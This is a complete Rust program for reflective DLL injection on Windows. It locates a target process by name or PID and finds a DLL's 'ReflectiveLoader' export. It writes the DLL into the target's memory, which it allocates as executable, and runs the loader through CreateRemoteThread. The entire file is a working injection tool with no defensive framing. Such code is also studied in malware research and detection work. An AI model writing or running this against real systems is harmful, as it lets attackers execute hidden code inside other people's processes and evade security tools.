use clap::Parser;
use std::fs;
use std::path::PathBuf;
use windows_sys::Win32::Foundation::*;
use windows_sys::Win32::System::Diagnostics::ToolHelp::*;
use windows_sys::Win32::System::Threading::*;
use windows_sys::Win32::System::Memory::*;
use windows_sys::Win32::System::Diagnostics::Debug::*;
use goblin::pe::PE;

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Path to the DLL to inject
    #[arg(short, long)]
    dll: PathBuf,

    /// Target process name or PID
    #[arg(short, long)]
    target: String,
}

fn find_process_by_name(process_name: &str) -> Option<u32> {
    let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };
    if snapshot == INVALID_HANDLE_VALUE {
        return None;
    }

    let mut entry: PROCESSENTRY32 = unsafe { std::mem::zeroed() };
    entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;

    if unsafe { Process32First(snapshot, &mut entry) } != 0 {
        loop {
            let name = unsafe {
                let len = entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(entry.szExeFile.len());
                String::from_utf8_lossy(std::slice::from_raw_parts(
                    entry.szExeFile.as_ptr() as *const u8,
                    len,
                ))
            };

            if name.to_lowercase() == process_name.to_lowercase() {
                unsafe { CloseHandle(snapshot) };
                return Some(entry.th32ProcessID);
            }

            if unsafe { Process32Next(snapshot, &mut entry) } == 0 {
                break;
            }
        }
    }

    unsafe { CloseHandle(snapshot) };
    None
}

fn get_pid(target: &str) -> Option<u32> {
    if let Ok(pid) = target.parse::<u32>() {
        Some(pid)
    } else {
        find_process_by_name(target)
    }
}

fn find_reflective_loader_offset(dll_bytes: &[u8]) -> Option<u32> {
    let pe = PE::parse(dll_bytes).ok()?;
    for export in pe.exports {
        if let Some(name) = export.name {
            if name == "ReflectiveLoader" || name == "_ReflectiveLoader@4" {
                // In some versions of goblin, export.offset is Option<usize>
                if let Some(offset) = export.offset {
                    return Some(offset as u32);
                }
            }
        }
    }
    None
}

fn main() {
    let args = Args::parse();

    let pid = match get_pid(&args.target) {
        Some(pid) => pid,
        None => {
            eprintln!("Error: Could not find process '{}'", args.target);
            return;
        }
    };

    let dll_bytes = match fs::read(&args.dll) {
        Ok(bytes) => bytes,
        Err(e) => {
            eprintln!("Error: Could not read DLL file: {}", e);
            return;
        }
    };

    let reflective_loader_offset = match find_reflective_loader_offset(&dll_bytes) {
        Some(offset) => offset,
        None => {
            eprintln!("Error: Could not find ReflectiveLoader export in DLL");
            return;
        }
    };

    println!("Target PID: {}", pid);
    println!("ReflectiveLoader offset: 0x{:x}", reflective_loader_offset);

    let process_handle = unsafe {
        OpenProcess(
            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
            0,
            pid,
        )
    };

    if process_handle == 0 {
        eprintln!("Error: Could not open process {}", pid);
        return;
    }

    let remote_buffer = unsafe {
        VirtualAllocEx(
            process_handle,
            std::ptr::null(),
            dll_bytes.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    if remote_buffer.is_null() {
        eprintln!("Error: Could not allocate memory in target process");
        unsafe { CloseHandle(process_handle) };
        return;
    }

    let mut bytes_written = 0;
    let write_result = unsafe {
        WriteProcessMemory(
            process_handle,
            remote_buffer,
            dll_bytes.as_ptr() as *const _,
            dll_bytes.len(),
            &mut bytes_written,
        )
    };

    if write_result == 0 || bytes_written != dll_bytes.len() {
        eprintln!("Error: Could not write DLL to target process");
        unsafe { CloseHandle(process_handle) };
        return;
    }

    let reflective_loader_addr = remote_buffer as usize + reflective_loader_offset as usize;
    println!("ReflectiveLoader remote address: 0x{:x}", reflective_loader_addr);

    let mut thread_id = 0;
    let thread_handle = unsafe {
        CreateRemoteThread(
            process_handle,
            std::ptr::null(),
            0,
            Some(std::mem::transmute(reflective_loader_addr)),
            remote_buffer,
            0,
            &mut thread_id,
        )
    };

    if thread_handle == 0 {
        eprintln!("Error: Could not create remote thread");
    } else {
        println!("Injected successfully! Remote thread ID: {}", thread_id);
        unsafe { CloseHandle(thread_handle) };
    }

    unsafe { CloseHandle(process_handle) };
}
